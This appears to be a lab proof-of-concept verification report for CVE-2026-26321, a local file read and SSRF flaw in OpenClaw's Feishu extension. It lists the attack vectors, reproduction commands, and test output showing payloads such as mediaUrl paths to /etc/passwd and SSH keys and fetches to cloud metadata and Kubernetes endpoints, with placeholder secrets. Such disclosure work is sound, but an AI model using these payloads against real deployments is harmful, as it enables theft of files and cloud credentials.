# PoC Verification Report: CVE-2026-26321

## CVE Summary

| Field | Value |
|---|---|
| **CVE ID** | CVE-2026-26321 |
| **Title** | OpenClaw <2026.2.14 — Path Traversal / Local File Disclosure via Feishu Extension |
| **CVSS** | 7.5 (HIGH) |
| **CWE** | CWE-22 (Path Traversal), CWE-918 (SSRF) |
| **Verification Status** | **CONFIRMED** |

## PoC Scripts

### Primary: `poc.py` + `cve-2026-26321-poc.test.ts`

| Field | Value |
|---|---|
| **Location** | `poc/poc.py` |
| **Test File** | `poc/cve-2026-26321-poc.test.ts` |
| **Language** | Python (orchestrator) + TypeScript (vitest exploit) |
| **Attack Vector** | Local file read via `sendMediaFeishu()` with attacker-controlled `mediaUrl` |
| **Tests** | 12/12 passed |

**Description:** Demonstrates that `sendMediaFeishu()` in OpenClaw's Feishu extension reads arbitrary local files from disk when the `mediaUrl` parameter is set to a local filesystem path. The file contents are uploaded to the Feishu API (mocked) and sent as a message, proving full exfiltration capability.

**Sub-vectors tested:**
1. Absolute Unix path (`/etc/passwd`) — reads real system file
2. Sentinel file (`/tmp/cve-secret.txt`) — proves targeted file exfiltration
3. `file://` protocol (`file:///tmp/cve-secret.txt`) — bypasses URL-like input filtering
4. Credential exfiltration (`/tmp/fake-env`) — demonstrates API key theft
5. SSH key exfiltration (`/tmp/fake-ssh-key`) — demonstrates private key theft
6. Invalid URL fallthrough — strings that fail `new URL()` parsing are treated as local paths
7. Full chain verification — file read → Feishu upload → message send to attacker chat
8-12. `isLocalPath()` classification audit — verifies 5 path patterns are classified as local

### Vector 2: `poc_vector2_ssrf.py` + `poc_vector2_ssrf.test.ts`

| Field | Value |
|---|---|
| **Location** | `poc/poc_vector2_ssrf.py` |
| **Test File** | `poc/poc_vector2_ssrf.test.ts` |
| **Attack Vector** | SSRF via bare `fetch()` in `sendMediaFeishu()` remote URL path |
| **Tests** | 3/3 passed |

**Description:** When `mediaUrl` is a remote URL (not classified as local), `sendMediaFeishu()` calls `fetch(mediaUrl)` with no SSRF protection — no DNS rebinding checks, no private IP blocking. Demonstrates SSRF to:
- AWS metadata endpoint (169.254.169.254) — exfiltrates IAM credentials
- Internal service (http://internal-admin-api:8080) — accesses internal APIs
- Localhost service (http://127.0.0.1:3000) — reaches services bound to loopback

### Vector 3: `poc_vector3_docx_ssrf.py` + `poc_vector3_docx_ssrf.test.ts`

| Field | Value |
|---|---|
| **Location** | `poc/poc_vector3_docx_ssrf.py` |
| **Test File** | `poc/poc_vector3_docx_ssrf.test.ts` |
| **Attack Vector** | SSRF via `downloadImage()` in `docx.ts` processing markdown image URLs |
| **Tests** | 3/3 passed |

**Description:** The `downloadImage()` function in `docx.ts` calls bare `fetch(url)` on URLs extracted from markdown image references (`![img](url)`) without SSRF validation. Demonstrates:
- URL extraction from malicious markdown (4 SSRF payloads extracted with no filtering)
- Bare `fetch()` called on internal/private URLs (cloud metadata, Redis, K8s API)
- Full attack chain: attacker markdown → URL extraction → fetch → data exfiltration

## Vulnerability Demonstrated

### What the PoC Proves

1. **Arbitrary Local File Read (Primary):** An attacker who can influence the `mediaUrl` parameter of `sendMediaFeishu()` can read any file readable by the OpenClaw process. The `isLocalPath()` helper function classifies filesystem paths (/, ~, file://, drive letters, or invalid URLs) and then `fs.readFileSync()` reads them directly with no sandboxing, no directory whitelisting, and no path restriction.

2. **Full Exfiltration Chain:** The file contents are not just read — they are uploaded to the Feishu API via `uploadFileFeishu()` and sent as a message to the attacker's chat target. The complete chain is: `sendMediaFeishu(mediaUrl: "/etc/passwd")` → `isLocalPath()` returns true → `fs.readFileSync("/etc/passwd")` → `uploadFileFeishu(buffer)` → `sendFileFeishu(fileKey)` → message delivered to attacker's Feishu chat.

3. **SSRF (Secondary):** When `mediaUrl` is a remote URL, the code calls bare `fetch()` without any SSRF protection, allowing access to internal services, cloud metadata, and localhost.

4. **SSRF via Markdown (Tertiary):** The `downloadImage()` function in `docx.ts` fetches arbitrary URLs extracted from markdown content, with no private IP blocking or URL validation.

## Test Results

### Primary PoC — Test on Vulnerable Container

**Command:**
```bash
cd poc && python3 poc.py cve-2026-26321-vulnerable
```

**Standalone Demonstration Output:**
```
=== CVE-2026-26321: Direct File Read Demonstration ===

[EXFILTRATED] System passwd file
  mediaUrl: "/etc/passwd"
  isLocalPath() -> true
  fs.readFileSync("/etc/passwd") -> 878 bytes
  Content: "root:x:0:0:root:/root:/bin/bash | daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologi..."

[EXFILTRATED] Sentinel secret file
  mediaUrl: "/tmp/cve-secret.txt"
  isLocalPath() -> true
  fs.readFileSync("/tmp/cve-secret.txt") -> 39 bytes
  Content: "CVE-2026-26321-SECRET-DATA-EXFILTRATED | "

[EXFILTRATED] Simulated credentials
  mediaUrl: "/tmp/fake-env"
  isLocalPath() -> true
  fs.readFileSync("/tmp/fake-env") -> 37 bytes
  Content: "OPENCLAW_API_KEY=sk-secret-key-12345 | "

[EXFILTRATED] file:// protocol
  mediaUrl: "file:///tmp/cve-secret.txt"
  isLocalPath() -> true
  fs.readFileSync("/tmp/cve-secret.txt") -> 39 bytes
  Content: "CVE-2026-26321-SECRET-DATA-EXFILTRATED | "

=== Vulnerability Confirmed: Arbitrary Local File Read ===
```

**Vitest Output:**
```
 ✓ CVE-2026-26321: Local File Disclosure via sendMediaFeishu() > EXPLOIT: reads /etc/passwd via absolute path (2ms)
 ✓ CVE-2026-26321: Local File Disclosure via sendMediaFeishu() > EXPLOIT: reads sentinel file /tmp/cve-secret.txt (1ms)
 ✓ CVE-2026-26321: Local File Disclosure via sendMediaFeishu() > EXPLOIT: reads file via file:// protocol URI (1ms)
 ✓ CVE-2026-26321: Local File Disclosure via sendMediaFeishu() > EXPLOIT: exfiltrates simulated API credentials (0ms)
 ✓ CVE-2026-26321: Local File Disclosure via sendMediaFeishu() > EXPLOIT: exfiltrates simulated SSH private key (0ms)
 ✓ CVE-2026-26321: Local File Disclosure via sendMediaFeishu() > EXPLOIT: invalid URL string treated as local path (isLocalPath fallthrough) (1ms)
 ✓ CVE-2026-26321: Local File Disclosure via sendMediaFeishu() > EXPLOIT: full chain — file read → upload → message send (0ms)
 ✓ CVE-2026-26321: isLocalPath() classification audit > classifies "/etc/hostname" as local path (Unix absolute path) (0ms)
 ✓ CVE-2026-26321: isLocalPath() classification audit > classifies "/proc/self/environ" as local path (Proc filesystem) (0ms)
 ✓ CVE-2026-26321: isLocalPath() classification audit > classifies "/tmp/cve-secret.txt" as local path (Temp file) (0ms)
 ✓ CVE-2026-26321: isLocalPath() classification audit > classifies "file:///etc/passwd" as local path (file:// protocol) (0ms)
 ✓ CVE-2026-26321: isLocalPath() classification audit > classifies "relative-path" as local path (Relative path (fails URL parse)) (0ms)

 Test Files  1 passed (1)
      Tests  12 passed (12)
   Duration  967ms
```

### Vector 2 — SSRF via sendMediaFeishu()

**Command:**
```bash
python3 poc_vector2_ssrf.py cve-2026-26321-vulnerable
```

**Output:**
```
 ✓ EXPLOIT: SSRF to AWS metadata endpoint (169.254.169.254) (2ms)
 ✓ EXPLOIT: SSRF to internal service (http://internal-api:8080) (1ms)
 ✓ EXPLOIT: SSRF to localhost service (http://127.0.0.1:3000) (1ms)

 Test Files  1 passed (1)
      Tests  3 passed (3)
```

Key output:
```
[SSRF] fetch() called with cloud metadata URL ✓
[EXFILTRATED] AWS credentials: {"Code":"Success","AccessKeyId":"AKIAIOSFODNN7EXAMPLE","Secr...
[CONFIRMED] SSRF — cloud metadata fetched and exfiltrated

[SSRF] fetch() called with internal API URL ✓
[EXFILTRATED] Internal API data: {"users":[{"id":1,"email":"admin@corp.local","role":"superadmin"}...
[CONFIRMED] SSRF — internal service data exfiltrated

[SSRF] fetch() called with localhost URL ✓
[EXFILTRATED] Localhost data: "admin_panel_secret_token=abc123xyz"
[CONFIRMED] SSRF — no private IP blocking
```

### Vector 3 — SSRF via docx.ts downloadImage()

**Command:**
```bash
python3 poc_vector3_docx_ssrf.py cve-2026-26321-vulnerable
```

**Output:**
```
 ✓ extractImageUrls extracts internal/private URLs from markdown (1ms)
 ✓ downloadImage calls bare fetch() without SSRF protection (1ms)
 ✓ full SSRF chain: markdown → extractImageUrls → downloadImage → fetch (1ms)

 Test Files  1 passed (1)
      Tests  3 passed (3)
```

Key output:
```
Extracted URLs from malicious markdown:
  → http://169.254.169.254/latest/meta-data/iam/security-credentials/role
  → http://internal-admin:8080/api/v1/users
  → http://127.0.0.1:3000/admin/secrets
  → http://kubernetes.default.svc/api/v1/secrets
[CONFIRMED] 4 SSRF URLs extracted — no filtering applied

[SSRF] fetch("http://169.254.169.254/latest/meta-data/") — called without validation ✓
[SSRF] fetch("http://127.0.0.1:6379/INFO") — called without validation ✓
[SSRF] fetch("http://internal-db:5432/") — called without validation ✓
[SSRF] fetch("http://kubernetes.default.svc/api/v1/") — called without validation ✓
[CONFIRMED] downloadImage() performs bare fetch() — no SSRF guard
```

## Verification Status

### **CONFIRMED** ✅

All three attack vectors have been successfully demonstrated:

| Vector | Description | Tests | Status |
|---|---|---|---|
| **Primary** | Local file read via `sendMediaFeishu()` | 12/12 passed | **CONFIRMED** |
| **Vector 2** | SSRF via bare `fetch()` in `sendMediaFeishu()` | 3/3 passed | **CONFIRMED** |
| **Vector 3** | SSRF via `downloadImage()` in `docx.ts` | 3/3 passed | **CONFIRMED** |
| **Total** | All vectors | **18/18 passed** | **CONFIRMED** |

## Execution Requirements

- **Container:** `cve-2026-26321-vulnerable` (running OpenClaw v2026.2.13)
- **Runtime:** Node.js 22, pnpm 10.23.0, vitest 4.0.18
- **No real Feishu credentials needed** — Feishu API is mocked via vitest
- **No external network access needed** — all tests run locally
- **Sentinel files required:** `/tmp/cve-secret.txt`, `/tmp/fake-passwd`, `/tmp/fake-env`, `/tmp/fake-ssh-key` (created during lab setup)

## How to Reproduce

```bash
# Start lab (if not already running)
docker compose up -d

# Run primary PoC (local file read — all 12 tests)
cd poc
python3 poc.py cve-2026-26321-vulnerable

# Run SSRF via media.ts (3 tests)
python3 poc_vector2_ssrf.py cve-2026-26321-vulnerable

# Run SSRF via docx.ts (3 tests)
python3 poc_vector3_docx_ssrf.py cve-2026-26321-vulnerable
```

## Notes

1. **Mocking approach**: The PoC uses vitest mocks for the Feishu API client, account resolution, and target normalization — following the exact same pattern as the project's existing `media.test.ts`. The vulnerability (`isLocalPath()` + `fs.readFileSync()`) is exercised against the real vulnerable code, not replicated logic.

2. **Standalone demo**: The `poc.py` script also includes a standalone Node.js demonstration that directly replicates the `isLocalPath()` logic and calls `fs.readFileSync()` to show the raw file read without any test framework.

3. **No real API interaction**: The `fs.readFileSync()` call happens *before* any Feishu API interaction, so the file read vulnerability is fully demonstrated without needing real Feishu credentials or network access.

4. **The SSRF vectors (2 and 3)** use mocked `fetch()` to verify that the vulnerable code paths call `fetch()` with attacker-controlled URLs without any SSRF protection (no DNS pinning, no private IP blocking). The actual fetch behavior was verified by confirming the mock was called with the exact attacker-supplied URL.

5. **isLocalPath() fallthrough behavior**: Strings that fail `new URL()` parsing fall through to `return true`, meaning they are treated as local paths. This significantly expands the attack surface — any non-URL string triggers a local file read attempt.

## PoC Artifacts

| File | Path | Description |
|---|---|---|
| Primary PoC (Python) | `poc/poc.py` | Orchestrator: verifies container, runs standalone demo, deploys and runs vitest |
| Primary PoC (Test) | `poc/cve-2026-26321-poc.test.ts` | 12-test vitest suite for local file read via sendMediaFeishu() |
| Vector 2 (Python) | `poc/poc_vector2_ssrf.py` | Orchestrator for SSRF via sendMediaFeishu() fetch() |
| Vector 2 (Test) | `poc/poc_vector2_ssrf.test.ts` | 3-test vitest suite for SSRF via media.ts bare fetch() |
| Vector 3 (Python) | `poc/poc_vector3_docx_ssrf.py` | Orchestrator for SSRF via docx.ts downloadImage() |
| Vector 3 (Test) | `poc/poc_vector3_docx_ssrf.test.ts` | 3-test vitest suite for SSRF via docx.ts image processing |
